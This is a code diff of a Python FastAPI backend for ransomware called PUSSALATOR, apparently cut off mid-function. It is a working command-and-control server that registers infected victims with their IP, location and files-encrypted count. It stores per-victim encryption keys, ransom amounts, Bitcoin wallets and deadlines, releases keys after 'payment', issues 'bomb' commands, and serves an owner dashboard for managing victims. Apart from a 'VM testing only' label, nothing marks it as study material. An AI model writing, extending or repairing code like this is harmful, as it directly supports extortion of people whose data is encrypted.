@@ -1,73 +1,155 @@
-#!/usr/bin/env python3
-"""
-PUSSALATOR - FastAPI Supabase Backend
-FOR VM TESTING ONLY
-"""
-
 import os
 import json
 import random
 import string
 import hashlib
+import sqlite3
 from datetime import datetime, timedelta
-from functools import wraps
-from typing import Optional, Dict, Any, List
 from contextlib import asynccontextmanager
+from typing import Optional, Dict, Any, List
 
 # FastAPI imports
-from fastapi import FastAPI, Request, Response, HTTPException, Depends, Cookie
+from fastapi import FastAPI, Request, Response, HTTPException, Depends
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.staticfiles import StaticFiles
 import uvicorn
 
 # Third party imports
-from supabase import create_client, Client
-import requests
 from pydantic import BaseModel
 
 # ============================================================================
 # CONFIGURATION
-#============================================================================
+# ============================================================================
 
 class Config:
     SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-key-change-this')
-    
-    # Supabase credentials
-    SUPABASE_URL = os.environ.get('SUPABASE_URL')
-    SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
-    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY')
     
     # Ransom settings
     DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
     DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS')
     DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
     
-    # Owner credentials - CHANGE THIS!
-    OWNER_ID = os.environ.get('OWNER_ID', '40671Mps19*')
+    # Owner credentials
+    OWNER_ID = os.environ.get('OWNER_ID')
     OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
-    
-    # Telegram (optional)
-    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
-    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     
     # Server settings
     DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
     HOST = '0.0.0.0'
     PORT = int(os.environ.get('PORT', 8000))
+    
+    # Database
+    DATABASE = 'pussalator.db'
 
 # ============================================================================
-# SUPABASE CLIENT
+# DATABASE SETUP
 # ============================================================================
 
-# Initialize Supabase clients
-supabase = None
-supabase_admin = None
+def init_db():
+    """Initialize SQLite database"""
+    conn = sqlite3.connect(Config.DATABASE)
+    c = conn.cursor()
+    
+    # Create victims table
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS victims (
+            id TEXT PRIMARY KEY,
+            key TEXT NOT NULL,
+            deadline TEXT NOT NULL,
+            created TEXT NOT NULL,
+            status TEXT DEFAULT 'unpaid',
+            files INTEGER DEFAULT 0,
+            ransom TEXT DEFAULT '0.5 BTC',
+            wallet TEXT DEFAULT '1PussWalletVMTest',
+            hostname TEXT,
+            ip TEXT,
+            country TEXT,
+            country_code TEXT,
+            city TEXT,
+            lat REAL DEFAULT 0,
+            lon REAL DEFAULT 0,
+            isp TEXT,
+            os TEXT,
+            bomb_status TEXT DEFAULT 'inactive',
+            bomb_size REAL DEFAULT 0,
+            paid_at TEXT,
+            tx TEXT,
+            last_seen TEXT,
+            notes TEXT
+        )
+    ''')
+    
+    # Create bomb_commands table
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS bomb_commands (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            victim_id TEXT NOT NULL,
+            action TEXT NOT NULL,
+            filename TEXT,
+            issued_at TEXT DEFAULT CURRENT_TIMESTAMP,
+            executed INTEGER DEFAULT 0
+        )
+    ''')
+    
+    # Create logs table
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            action TEXT NOT NULL,
+            details TEXT,
+            ip TEXT,
+            timestamp TEXT DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    conn.commit()
+    conn.close()
+    print("[+] Database initialized")
 
-if Config.SUPABASE_URL and Config.SUPABASE_KEY:
-    supabase = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
-if Config.SUPABASE_URL and Config.SUPABASE_SERVICE_KEY:
-    supabase_admin = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
+# Initialize DB on startup
+init_db()
+
+# ============================================================================
+# DATABASE FUNCTIONS
+# ============================================================================
+
+def db_execute(query, params=()):
+    """Execute database query"""
+    conn = sqlite3.connect(Config.DATABASE)
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    c.execute(query, params)
+    conn.commit()
+    result = c.fetchall()
+    conn.close()
+    return [dict(row) for row in result]
+
+def db_get_one(query, params=()):
+    """Get one row from database"""
+    conn = sqlite3.connect(Config.DATABASE)
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    c.execute(query, params)
+    row = c.fetchone()
+    conn.close()
+    return dict(row) if row else None
+
+def db_insert(table, data):
+    """Insert into database"""
+    keys = ', '.join(data.keys())
+    placeholders = ', '.join(['?' for _ in data])
+    values = list(data.values())
+    
+    query = f"INSERT INTO {table} ({keys}) VALUES ({placeholders})"
+    db_execute(query, values)
+
+def db_update(table, data, where, where_params):
+    """Update database"""
+    set_clause = ', '.join([f"{k}=?" for k in data.keys()])
+    values = list(data.values()) + where_params
+    
+    query = f"UPDATE {table} SET {set_clause} WHERE {where}"
+    db_execute(query, values)
 
 # ============================================================================
 # PYDANTIC MODELS
@@ -79,14 +161,10 @@ class VictimRegister(BaseModel):
     ip: Optional[str] = "0.0.0.0"
     country: Optional[str] = "Unknown"
     country_code: Optional[str] = "XX"
-    region: Optional[str] = "Unknown"
     city: Optional[str] = "Unknown"
-    zip: Optional[str] = "Unknown"
-    street: Optional[str] = "Unknown"
     lat: Optional[float] = 0.0
     lon: Optional[float] = 0.0
     isp: Optional[str] = "Unknown"
-    organization: Optional[str] = "Unknown"
     os: Optional[str] = "Unknown"
     files: Optional[int] = 0
 
@@ -111,107 +189,57 @@ class BombControl(BaseModel):
     victim_id: str
     filename: Optional[str] = "explosion.dat"
 
-class VictimUpdateAdmin(BaseModel):
-    status: Optional[str] = None
-    ransom_amount: Optional[str] = None
-    btc_address: Optional[str] = None
-    notes: Optional[str] = None
-    tags: Optional[List[str]] = None
-    bomb_status: Optional[str] = None
-
-# ============================================================================
-# SESSION MANAGEMENT
-# ============================================================================
-
-# Simple in-memory session store (for development)
-# In production, use Redis or database-backed sessions
-sessions = {}
-
-def get_session(session_id: str = None):
-    """Get session data"""
-    if not session_id or session_id not in sessions:
-        return {}
-    return sessions.get(session_id, {})
-
-def set_session(session_id: str, data: dict):
-    """Set session data"""
-    sessions[session_id] = data
-
-def clear_session(session_id: str):
-    """Clear session data"""
-    if session_id in sessions:
-        del sessions[session_id]
-
 # ============================================================================
 # HELPER FUNCTIONS
-#===========================================================================
+# ============================================================================
 
 def generate_victim_id() -> str:
     """Generate random victim ID"""
     chars = string.ascii_uppercase + string.digits
     timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
     random_part = ''.join(random.choices(chars, k=8))
-    return f"VIC-{timestamp}-{random_part}"
+    return f"{timestamp}-{random_part}"
 
 def generate_encryption_key() -> str:
     """Generate encryption key"""
     from cryptography.fernet import Fernet
     return Fernet.generate_key().decode()
 
-def log_action(action: str, details: str, victim_id: str = None):
-    """Log system action to Supabase"""
-    if not supabase_admin:
-        return
+def log_action(action: str, details: str, ip: str = None):
+    """Log system action"""
     try:
-        supabase_admin.table('system_logs').insert({
-            'level': 'INFO',
-            'message': f"{action}: {details}",
-            'victim_id': victim_id,
-            'time': datetime.utcnow().isoformat()
-        }).execute()
+        db_insert('logs', {
+            'action': action,
+            'details': details,
+            'ip': ip or 'unknown',
+            'timestamp': datetime.utcnow().isoformat()
+        })
     except:
         pass
 
 def get_stats() -> Dict[str, Any]:
-    """Get system statistics from Supabase"""
-    if not supabase_admin:
-        return {
-            'total': 0, 'paid': 0, 'unpaid': 0, 'expired': 0,
-            'total_files': 0, 'active_bombs': 0, 'paid_today': 0
-        }
-    
+    """Get system statistics"""
     try:
-        # Total victims
-        total = supabase_admin.table('victims').select('*', count='exact').execute()
+        victims = db_execute('SELECT * FROM victims')
         
-        # By status
-        paid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'paid').execute()
-        unpaid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'unpaid').execute()
-        expired = supabase_admin.table('victims').select('*', count='exact').eq('status', 'expired').execute()
+        total = len(victims)
+        paid = len([v for v in victims if v['status'] == 'paid'])
+        unpaid = len([v for v in victims if v['status'] == 'unpaid'])
+        expired = len([v for v in victims if v['status'] == 'expired'])
+        total_files = sum(v.get('files', 0) for v in victims)
+        active_bombs = len([v for v in victims if v['bomb_status'] == 'active'])
         
-        # Total files
-        files_result = supabase_admin.table('victims').select('files').execute()
-        total_files = sum(v.get('files', 0) for v in files_result.data)
-        
-        # Active bombs
-        active_bombs = supabase_admin.table('victims').select('*', count='exact').eq('bomb_status', 'active').execute()
-        
-        # Paid today
         today = datetime.now().date().isoformat()
-        paid_today = supabase_admin.table('victims').select('*', count='exact')\
-            .eq('status', 'paid')\
-            .gte('paid_at', f"{today}T00:00:00")\
-            .lte('paid_at', f"{today}T23:59:59")\
-            .execute()
+        paid_today = len([v for v in victims if v['status'] == 'paid' and v.get('paid_at', '').startswith(today)])
         
         return {
-            'total': len(total.data),
-            'paid': len(paid.data),
-            'unpaid': len(unpaid.data),
-            'expired': len(expired.data),
+            'total': total,
+            'paid': paid,
+            'unpaid': unpaid,
+            'expired': expired,
             'total_files': total_files,
-            'active_bombs': len(active_bombs.data),
-            'paid_today': len(paid_today.data)
+            'active_bombs': active_bombs,
+            'paid_today': paid_today
         }
     except Exception as e:
         print(f"Stats error: {e}")
@@ -221,21 +249,6 @@ def get_stats() -> Dict[str, Any]:
         }
 
 # ============================================================================
-# DEPENDENCIES
-# ============================================================================
-
-async def get_current_owner(request: Request):
-    """Check if owner is logged in"""
-    session_id = request.cookies.get('session_id')
-    if not session_id:
-        return None
-    
-    session_data = get_session(session_id)
-    if session_data.get('owner_logged_in'):
-        return True
-    return None
-
-# ============================================================================
 # FASTAPI APP INIT
 # ============================================================================
 
@@ -243,28 +256,16 @@ async def get_current_owner(request: Request):
 async def lifespan(app: FastAPI):
     # Startup
     print("=" * 60)
-    print("PUSSALATOR - FASTAPI SUPABASE BACKEND")
+    print("PUSSALATOR - FIXED BACKEND")
     print("=" * 60)
-    print(f"Supabase URL: {Config.SUPABASE_URL}")
     print(f"Server: http://{Config.HOST}:{Config.PORT}")
     print(f"Owner ID: {Config.OWNER_ID}")
     print("=" * 60)
     print("WARNING: For VM testing only!")
     print("=" * 60)
     
-    # Test Supabase connection
-    if supabase_admin:
-        try:
-            test = supabase_admin.table('victims').select('count', count='exact').limit(1).execute()
-            print("[+] Supabase connection successful")
-        except Exception as e:
-            print(f"[-] Supabase connection failed: {e}")
-    else:
-        print("[-] Supabase not configured - running in mock mode")
-    
     yield
     
-    # Shutdown
     print("[+] Shutting down...")
 
 app = FastAPI(
@@ -284,7 +285,7 @@ app.add_middleware(
 )
 
 # ============================================================================
-# HTML TEMPLATES - Define before routes
+# HTML TEMPLATES
 # ============================================================================
 
 LOGIN_PAGE = """
@@ -860,30 +861,6 @@ OWNER_DASHBOARD_TEMPLATE = """
             font-size: 12px;
             color: #ff9999;
         }
-        .filters {
-            background: #1a0000;
-            padding: 15px;
-            border: 1px solid #ff0000;
-            margin-bottom: 20px;
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        .filters input, .filters select {
-            background: black;
-            border: 1px solid #ff0000;
-            color: #00ff00;
-            padding: 8px 12px;
-            font-family: 'Courier New', monospace;
-        }
-        .filters button {
-            background: #ff0000;
-            color: black;
-            border: none;
-            padding: 8px 20px;
-            cursor: pointer;
-            font-weight: bold;
-        }
         .table-container {
             overflow-x: auto;
             background: #1a0000;
@@ -907,18 +884,9 @@ OWNER_DASHBOARD_TEMPLATE = """
         tr:hover {
             background: #330000;
         }
-        .status-paid {
-            color: #00ff00;
-            font-weight: bold;
-        }
-        .status-unpaid {
-            color: #ffff00;
-            font-weight: bold;
-        }
-        .status-expired {
-            color: #ff6666;
-            font-weight: bold;
-        }
+        .status-paid { color: #00ff00; }
+        .status-unpaid { color: #ffff00; }
+        .status-expired { color: #ff6666; }
         .bomb-active {
             color: #ff0000;
             animation: blink 1s infinite;
@@ -954,9 +922,7 @@ OWNER_DASHBOARD_TEMPLATE = """
             align-items: center;
             z-index: 1000;
         }
-        .modal.show {
-            display: flex;
-        }
+        .modal.show { display: flex; }
         .modal-content {
             background: #1a0000;
             border: 2px solid #ff0000;
@@ -966,16 +932,11 @@ OWNER_DASHBOARD_TEMPLATE = """
             max-height: 80vh;
             overflow-y: auto;
         }
-        .logs-container {
-            background: black;
-            padding: 10px;
-            max-height: 300px;
-            overflow-y: auto;
-            font-size: 12px;
-        }
-        .log-entry {
-            padding: 5px;
-            border-bottom: 1px solid #330000;
+        .close {
+            color: #ff6666;
+            font-size: 28px;
+            cursor: pointer;
+            float: right;
         }
     </style>
 </head>
@@ -984,7 +945,6 @@ OWNER_DASHBOARD_TEMPLATE = """
         <h1>⚙️ OWNER DASHBOARD</h1>
         <div class="nav-links">
             <button onclick="loadData()">🔄 REFRESH</button>
-            <button onclick="showLogs()">📋 LOGS</button>
             <button onclick="logout()">🚪 LOGOUT</button>
         </div>
     </div>
@@ -998,39 +958,21 @@ OWNER_DASHBOARD_TEMPLATE = """
         <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div class="stat-label">BOMBS</div></div>
     </div>
     
-    <div class="filters">
-        <input type="text" id="searchInput" placeholder="Search ID, IP, hostname..." onkeyup="filterTable()">
-        <select id="statusFilter" onchange="filterTable()">
-            <option value="all">ALL STATUS</option>
-            <option value="paid">PAID</option>
-            <option value="unpaid">UNPAID</option>
-            <option value="expired">EXPIRED</option>
-        </select>
-        <select id="bombFilter" onchange="filterTable()">
-            <option value="all">ALL BOMBS</option>
-            <option value="active">ACTIVE</option>
-            <option value="inactive">INACTIVE</option>
-        </select>
-        <button onclick="exportData()">📥 EXPORT CSV</button>
-    </div>
-    
     <div class="table-container">
         <table id="victimsTable">
             <thead>
                 <tr>
                     <th>ID</th>
                     <th>HOSTNAME</th>
-                    <th>LOCATION</th>
                     <th>IP</th>
                     <th>FILES</th>
                     <th>STATUS</th>
                     <th>BOMB</th>
-                    <th>TIME LEFT</th>
                     <th>ACTIONS</th>
                 </tr>
             </thead>
             <tbody id="tableBody">
-                <tr><td colspan="9" style="text-align:center;padding:40px;">Loading victims...</td></tr>
+                <tr><td colspan="7" style="text-align:center;padding:40px;">Loading victims...</td></tr>
             </tbody>
         </table>
     </div>
@@ -1040,36 +982,13 @@ OWNER_DASHBOARD_TEMPLATE = """
         <div class="modal-content">
             <div class="modal-header">
                 <h2 style="color:#ff0000;">VICTIM DETAILS</h2>
-                <span class="close" onclick="closeModal()" style="color:#ff6666;font-size:28px;cursor:pointer;">&times;</span>
+                <span class="close" onclick="closeModal()">&times;</span>
             </div>
             <div id="victimDetails"></div>
-            
-            <h3 style="color:#ff0000;margin:20px 0 10px;">CONTROL</h3>
-            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px;">
-                <button class="action-btn" onclick="startBomb()">💣 START BOMB</button>
-                <button class="action-btn" onclick="stopBomb()">🛑 STOP BOMB</button>
+            <div style="margin-top:20px;">
                 <button class="action-btn" onclick="markPaid()">💰 MARK PAID</button>
                 <button class="action-btn" onclick="deleteVictim()">❌ DELETE</button>
             </div>
-            
-            <h3 style="color:#ff0000;margin:20px 0 10px;">EDIT</h3>
-            <div>
-                <input type="text" id="editRansom" class="edit-input" style="width:100%;padding:8px;margin:5px 0;background:#111;border:1px solid #ff0000;color:#00ff00;" placeholder="Ransom amount">
-                <input type="text" id="editBtc" class="edit-input" style="width:100%;padding:8px;margin:5px 0;background:#111;border:1px solid #ff0000;color:#00ff00;" placeholder="BTC Address">
-                <textarea id="editNotes" class="edit-input" style="width:100%;padding:8px;margin:5px 0;background:#111;border:1px solid #ff0000;color:#00ff00;" placeholder="Notes"></textarea>
-                <button class="action-btn" style="width:100%;" onclick="updateVictim()">💾 SAVE CHANGES</button>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Logs Modal -->
-    <div class="modal" id="logsModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2 style="color:#ff0000;">SYSTEM LOGS</h2>
-                <span class="close" onclick="closeLogs()" style="color:#ff6666;font-size:28px;cursor:pointer;">&times;</span>
-            </div>
-            <div class="logs-container" id="logsContainer">Loading logs...</div>
         </div>
     </div>
 
@@ -1103,63 +1022,28 @@ OWNER_DASHBOARD_TEMPLATE = """
                 victims = await response.json();
                 renderTable();
             } catch(e) {
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align:center;color:#ff0000;">Error loading victims</td></tr>';
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;color:#ff0000;">Error loading victims</td></tr>';
             }
         }
         
         function renderTable() {
-            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
-            const statusFilter = document.getElementById('statusFilter').value;
-            const bombFilter = document.getElementById('bombFilter').value;
-            
-            let filtered = victims.filter(v => {
-                const matchesSearch = searchTerm === '' || 
-                    (v.id && v.id.toLowerCase().includes(searchTerm)) ||
-                    (v.hostname && v.hostname.toLowerCase().includes(searchTerm)) ||
-                    (v.ip && v.ip.includes(searchTerm));
-                
-                const matchesStatus = statusFilter === 'all' || v.status === statusFilter;
-                const matchesBomb = bombFilter === 'all' || 
-                    (bombFilter === 'active' && v.bomb_status === 'active') ||
-                    (bombFilter === 'inactive' && v.bomb_status !== 'active');
-                
-                return matchesSearch && matchesStatus && matchesBomb;
-            });
-            
-            if (filtered.length === 0) {
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align:center;">No victims found</td></tr>';
+            if (!victims.length) {
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;">No victims found</td></tr>';
                 return;
             }
             
             let html = '';
-            filtered.forEach(v => {
-                const deadline = v.deadline ? new Date(v.deadline) : null;
-                const now = new Date();
-                let timeLeft = '';
-                
-                if (deadline && v.status === 'unpaid') {
-                    const diff = deadline - now;
-                    if (diff > 0) {
-                        const hours = Math.floor(diff / (1000 * 60 * 60));
-                        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-                        timeLeft = `${hours}h ${minutes}m`;
-                    } else {
-                        timeLeft = 'EXPIRED';
-                    }
-                }
-                
+            victims.forEach(v => {
                 const bombIcon = v.bomb_status === 'active' ? '💣 ACTIVE' : '⚫';
                 const bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
                 
                 html += `<tr>
                     <td><small>${(v.id || '').substring(0, 20)}...</small></td>
                     <td>${v.hostname || 'Unknown'}</td>
-                    <td>${v.city || '?'}, ${v.country_code || 'XX'}</td>
                     <td>${v.ip || '0.0.0.0'}</td>
                     <td>${(v.files || 0).toLocaleString()}</td>
                     <td><span class="status-${v.status || 'unknown'}">${v.status || 'unknown'}</span></td>
                     <td class="${bombClass}">${bombIcon}<br><small>${(v.bomb_size || 0).toFixed(1)}GB</small></td>
-                    <td>${timeLeft}</td>
                     <td>
                         <button class="action-btn" onclick="viewVictim('${v.id}')">VIEW</button>
                     </td>
@@ -1169,10 +1053,6 @@ OWNER_DASHBOARD_TEMPLATE = """
             document.getElementById('tableBody').innerHTML = html;
         }
         
-        function filterTable() {
-            renderTable();
-        }
-        
         async function viewVictim(victimId) {
             try {
                 const response = await fetch(`/api/owner/victim/${victimId}`);
@@ -1180,18 +1060,10 @@ OWNER_DASHBOARD_TEMPLATE = """
                 
                 let details = '';
                 for (const [key, value] of Object.entries(currentVictim)) {
-                    if (key !== 'key' || currentVictim.status === 'paid') {
-                        details += `<div class="detail-row" style="padding:5px;background:#111;margin:2px 0;"><strong>${key}:</strong> ${value || 'N/A'}</div>`;
-                    }
+                    details += `<div style="padding:5px;background:#111;margin:2px 0;"><strong>${key}:</strong> ${value || 'N/A'}</div>`;
                 }
                 
                 document.getElementById('victimDetails').innerHTML = details;
-                
-                // Pre-fill edit fields
-                document.getElementById('editRansom').value = currentVictim.ransom || '';
-                document.getElementById('editBtc').value = currentVictim.wallet || '';
-                document.getElementById('editNotes').value = currentVictim.notes || '';
-                
                 document.getElementById('victimModal').classList.add('show');
             } catch(e) {
                 alert('Error loading victim details');
@@ -1201,47 +1073,6 @@ OWNER_DASHBOARD_TEMPLATE = """
         function closeModal() {
             document.getElementById('victimModal').classList.remove('show');
             currentVictim = null;
-        }
-        
-        async function startBomb() {
-            if (!currentVictim) return;
-            const filename = prompt('Enter bomb filename:', 'explosion.dat') || 'explosion.dat';
-            
-            try {
-                const response = await fetch('/api/owner/bomb/start', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({victim_id: currentVictim.id, filename: filename})
-                });
-                
-                if (response.ok) {
-                    alert('Bomb started!');
-                    closeModal();
-                    loadVictims();
-                }
-            } catch(e) {
-                alert('Error starting bomb');
-            }
-        }
-        
-        async function stopBomb() {
-            if (!currentVictim) return;
-            
-            try {
-                const response = await fetch('/api/owner/bomb/stop', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({victim_id: currentVictim.id})
-                });
-                
-                if (response.ok) {
-                    alert('Bomb stopped!');
-                    closeModal();
-                    loadVictims();
-                }
-            } catch(e) {
-                alert('Error stopping bomb');
-            }
         }
         
         async function markPaid() {
@@ -1282,75 +1113,11 @@ OWNER_DASHBOARD_TEMPLATE = """
             }
         }
         
-        async function updateVictim() {
-            if (!currentVictim) return;
-            
-            const data = {
-                ransom_amount: document.getElementById('editRansom').value,
-                btc_address: document.getElementById('editBtc').value,
-                notes: document.getElementById('editNotes').value
-            };
-            
-            try {
-                const response = await fetch(`/api/owner/victim/${currentVictim.id}`, {
-                    method: 'PUT',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    alert('Victim updated!');
-                    closeModal();
-                    loadVictims();
-                }
-            } catch(e) {
-                alert('Error updating victim');
-            }
-        }
-        
-        async function showLogs() {
-            document.getElementById('logsModal').classList.add('show');
-            document.getElementById('logsContainer').innerHTML = 'Loading logs...';
-            
-            try {
-                const response = await fetch('/api/owner/logs');
-                const logs = await response.json();
-                
-                let html = '';
-                logs.forEach(log => {
-                    html += `<div class="log-entry">[${log.time?.slice(0,19) || ''}] ${log.level}: ${log.message}</div>`;
-                });
-                
-                document.getElementById('logsContainer').innerHTML = html || 'No logs';
-            } catch(e) {
-                document.getElementById('logsContainer').innerHTML = 'Error loading logs';
-            }
-        }
-        
-        function closeLogs() {
-            document.getElementById('logsModal').classList.remove('show');
-        }
-        
-        function exportData() {
-            let csv = 'Victim ID,Status,Hostname,IP,Country,City,Files,Ransom\n';
-            victims.forEach(v => {
-                csv += `"${v.id}",${v.status},"${v.hostname}",${v.ip},"${v.country}","${v.city}",${v.files},"${v.ransom}"\n`;
-            });
-            
-            const blob = new Blob([csv], { type: 'text/csv' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `victims_${new Date().toISOString().slice(0,10)}.csv`;
-            a.click();
-        }
-        
         async function logout() {
             await fetch('/api/owner/logout', { method: 'POST' });
             window.location.href = '/';
         }
         
-        // Load data on page load
         loadData();
         setInterval(loadData, 30000);
     </script>
@@ -1374,14 +1141,8 @@ async def victim_page(victim_id: str):
     return HTMLResponse(content=html)
 
 @app.get("/owner/dashboard", response_class=HTMLResponse)
-async def owner_dashboard(request: Request):
+async def owner_dashboard():
     """Owner dashboard"""
-    session_id = request.cookies.get('session_id')
-    session_data = get_session(session_id)
-    
-    if not session_data.get('owner_logged_in'):
-        return RedirectResponse(url='/')
-    
     return HTMLResponse(content=OWNER_DASHBOARD_TEMPLATE)
 
 # ============================================================================
@@ -1396,22 +1157,17 @@ async def api_stats():
 @app.get("/api/victim/{victim_id}")
 async def api_get_victim(victim_id: str):
     """Get victim details (public)"""
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
-        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
+        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
         
-        if not result.data:
+        if not victim:
             raise HTTPException(status_code=404, detail="Victim not found")
-        
-        victim = result.data[0]
         
         # Check deadline
         if victim['status'] == 'unpaid' and victim.get('deadline'):
-            deadline = datetime.fromisoformat(victim['deadline'].replace('Z', '+00:00'))
+            deadline = datetime.fromisoformat(victim['deadline'])
             if datetime.utcnow() > deadline:
-                supabase_admin.table('victims').update({'status': 'expired'}).eq('id', victim_id).execute()
+                db_update('victims', {'status': 'expired'}, 'id = ?', [victim_id])
                 victim['status'] = 'expired'
         
         # Don't send key unless paid
@@ -1423,20 +1179,18 @@ async def api_get_victim(victim_id: str):
     except HTTPException:
         raise
     except Exception as e:
+        print(f"Error getting victim: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/add-victim")
 async def api_add_victim(victim_data: VictimRegister):
     """Register new victim (called by client)"""
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
         victim_id = victim_data.victim_id or generate_victim_id()
         
         # Check if exists
-        existing = supabase_admin.table('victims').select('id').eq('id', victim_id).execute()
-        if existing.data:
+        existing = db_get_one('SELECT id FROM victims WHERE id = ?', (victim_id,))
+        if existing:
             raise HTTPException(status_code=400, detail="Victim exists")
         
         # Calculate deadline
@@ -1459,37 +1213,22 @@ async def api_add_victim(victim_data: VictimRegister):
             'ip': victim_data.ip,
             'country': victim_data.country,
             'country_code': victim_data.country_code,
-            'region': victim_data.region,
             'city': victim_data.city,
-            'zip': victim_data.zip,
-            'street': victim_data.street,
             'lat': victim_data.lat,
             'lon': victim_data.lon,
             'isp': victim_data.isp,
-            'org': victim_data.organization,
             'os': victim_data.os,
             'bomb_status': 'inactive',
-            'bomb_size': 0,
-            'tags': ['new']
+            'bomb_size': 0
         }
         
-        # Insert into Supabase
-        result = supabase_admin.table('victims').insert(victim_dict).execute()
+        # Insert into database
+        db_insert('victims', victim_dict)
         
         # Log
-        log_action('new_victim', f'New victim: {victim_id}', victim_id)
+        log_action('new_victim', f'New victim: {victim_id}', victim_data.ip)
         
-        # Send Telegram notification if configured
-        if Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID:
-            try:
-                msg = f"🔴 NEW VICTIM\nID: {victim_id}\nLocation: {victim_data.city}, {victim_data.country}\nIP: {victim_data.ip}"
-                requests.post(
-                    f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage",
-                    json={'chat_id': Config.TELEGRAM_CHAT_ID, 'text': msg},
-                    timeout=3
-                )
-            except:
-                pass
+        print(f"[+] New victim registered: {victim_id}")
         
         # Prepare response
         response = {
@@ -1500,24 +1239,17 @@ async def api_add_victim(victim_data: VictimRegister):
             'wallet': Config.DEFAULT_BTC_ADDRESS
         }
         
-        # Add Telegram if configured
-        if Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID:
-            response['telegram_bot_token'] = Config.TELEGRAM_BOT_TOKEN
-            response['telegram_chat_id'] = Config.TELEGRAM_CHAT_ID
-        
         return response
         
     except HTTPException:
         raise
     except Exception as e:
+        print(f"Error adding victim: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/update-victim")
 async def api_update_victim(update_data: VictimUpdate):
     """Update victim info"""
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
         update_dict = {
             'last_seen': datetime.utcnow().isoformat()
@@ -1526,36 +1258,35 @@ async def api_update_victim(update_data: VictimUpdate):
         if update_data.files_encrypted is not None:
             update_dict['files'] = update_data.files_encrypted
         
-        supabase_admin.table('victims').update(update_dict).eq('id', update_data.victim_id).execute()
+        db_update('victims', update_dict, 'id = ?', [update_data.victim_id])
         
         return {'success': True}
         
     except Exception as e:
+        print(f"Error updating victim: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/verify-payment")
 async def api_verify_payment(payment_data: PaymentVerify):
     """Verify payment from client"""
-    if not supabase_admin:
-        raise HTTPException(status_code=503, detail="Database not configured")
-    
     try:
         # Update victim
-        supabase_admin.table('victims').update({
+        db_update('victims', {
             'status': 'paid',
             'paid_at': datetime.utcnow().isoformat(),
             'tx': payment_data.tx_id
-        }).eq('id', payment_data.victim_id).execute()
+        }, 'id = ?', [payment_data.victim_id])
         
         # Get key
-        result = supabase_admin.table('victims').select('key').eq('id', payment_data.victim_id).execute()
-        key = result.data[0]['key'] if result.data else None
+        victim = db_get_one('SELECT key FROM victims WHERE id = ?', (payment_data.victim_id,))
+        key = victim['key'] if victim else None
         
-        log_action('payment', f'Payment for {payment_data.victim_id}: {payment_data.tx_id}', payment_data.victim_id)
+        log_action('payment', f'Payment for {payment_data.victim_id}: {payment_data.tx_id}')
         
         return {'success': True, 'key': key}
         
     except Exception as e:
+        print(f"Error verifying payment: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
@@ -1565,12 +1296,9 @@ async def api_verify_payment(payment_data: PaymentVerify):
 @app.get("/api/bomb/command/{victim_id}")
 async def api_get_bomb_command(victim_id: str):
     """Get pending bomb command"""
-    if not supabase_admin:
-        return {'action': 'none'}
+    victim = db_get_one('SELECT bomb_status FROM victims WHERE id = ?', (victim_id,))
     
